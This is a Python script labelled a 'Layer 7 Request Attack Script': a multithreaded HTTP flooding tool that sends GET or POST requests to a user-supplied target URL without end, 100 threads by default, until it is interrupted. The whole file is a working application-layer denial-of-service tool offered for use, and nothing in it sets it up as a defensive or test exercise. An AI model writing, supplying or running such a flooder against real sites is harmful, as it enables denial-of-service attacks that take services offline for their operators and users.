import threading
import requests
import time
import os
import random
from multiprocessing.dummy import Pool as ThreadPool
from datetime import datetime
import argparse

def send_request(url, method="GET", verbose=False):
    try:
        # Start time for ping calculation
        start_time = time.time()
        
        if method == "GET":
            response = requests.get(url)
        elif method == "POST":
            # For demonstration, sending a basic random data payload
            data = {'key': random.randint(1, 1000)}
            response = requests.post(url, data=data)

        # End time for ping calculation
        end_time = time.time()

        # Calculate ping (in ms)
        ping = (end_time - start_time) * 1000

        # Get response content length
        packet_size = len(response.content)

        if verbose:
            # Timestamp, method, packet size, and ping time
            print(f"{datetime.now()} | Method: {method} | Status Code: {response.status_code} | "
                  f"Packet Size: {packet_size} bytes | Ping: {ping:.2f} ms")
    except Exception as e:
        print(f"Error: {e}")

# Function to start sending requests with multiple threads
def start_attack(url, method="GET", threads=100, verbose=False):
    # Create a thread pool
    pool = ThreadPool(threads)
    
    try:
        # Run the attack continuously in parallel threads
        while True:
            pool.starmap(send_request, [(url, method, verbose) for _ in range(threads)])
    except KeyboardInterrupt:
        print("Attack stopped.")
        pool.close()
        pool.join()

if __name__ == "__main__":
    # Argument parser for user input
    parser = argparse.ArgumentParser(description="Layer 7 Request Attack Script")
    parser.add_argument('target', help="Target URL (e.g. http://example.com)")
    parser.add_argument('-m', '--method', help="HTTP Method to use (GET or POST)", default="GET")
    parser.add_argument('-t', '--threads', type=int, help="Number of threads", default=100)
    parser.add_argument('-v', '--verbose', help="Enable verbose output", action='store_true')

    args = parser.parse_args()

    # Input for URL, method, number of threads, and verbosity
    url = args.target
    method = args.method.upper()
    threads = args.threads
    verbose = args.verbose

    print(f"Starting attack on {url} with {threads} threads using {method} method...")
    start_attack(url, method, threads, verbose)
